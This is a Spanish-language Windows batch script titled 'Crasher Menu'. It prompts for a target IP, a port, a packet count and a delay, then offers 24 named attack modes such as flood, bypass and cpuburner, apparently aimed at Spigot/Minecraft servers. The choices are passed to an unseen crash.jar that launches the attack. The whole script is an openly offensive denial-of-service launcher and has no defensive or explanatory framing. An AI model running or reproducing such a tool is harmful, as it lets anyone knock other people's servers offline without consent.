@echo off
title Crasher Menu
color 02
@echo ----------------------------------------------
@echo -------------    Crasher Menu    -------------
@echo ------------  Created By Craciu  -------------
@echo ----------------------------------------------
set /p IP=IP a Atacar : 
set /p Puerto=Puerto de la IP: 
set /p Pqq=Cantidad de paquetes a enviar: 
set /p de=Delay: 
cls
@echo 1. localhost
@echo 2. bosshandler (Normal)
@echo 3. cpulagger (Normal)
@echo 4. test1 (Normal)
@echo 5. test2 (Normal)
@echo 6. flood1 (Medio)
@echo 7. flood2 (Medio)
@echo 8. spigot1 (Medio)
@echo 9. spigot2 (Medio)
@echo 10. bypass1 (Medio-Alto)
@echo 11. bypass2 (Medio-Alto)
@echo 12. bypass3 (Medio-Alto)
@echo 13. extreme1 (Alto)
@echo 14. extreme2 (Alto)
@echo 15. extreme3 (Alto)
@echo 16. extreme4 (Alto)
@echo 17. extreme5 (Alto)
@echo 18. cpuburner1 (Muy-alto)
@echo 19. cpuburner2 (Muy-alto)
@echo 20. cpuburner3 (Muy-alto)
@echo 21. cpuburner4 (Muy-alto)
@echo 22. cpuburner5 (Muy-alto)
@echo 23. cpuburner6 (Muy-alto)
@echo 24. cpuburner7 (Muy-alto)
set /p tm=Tipo ataque: 
cls
set /p userinp=---- Presiona una tecla para  ejecutarlo  ----
set userinp=%userinp:~0,1% 
java -jar crash.jar %IP% %Puerto% %Pqq% %Pqq% %de% %tm%
cls
@echo ----------------------------------------------
@echo Operacion Completada...
@echo ----------------------------------------------
TIMEOUT 3
close
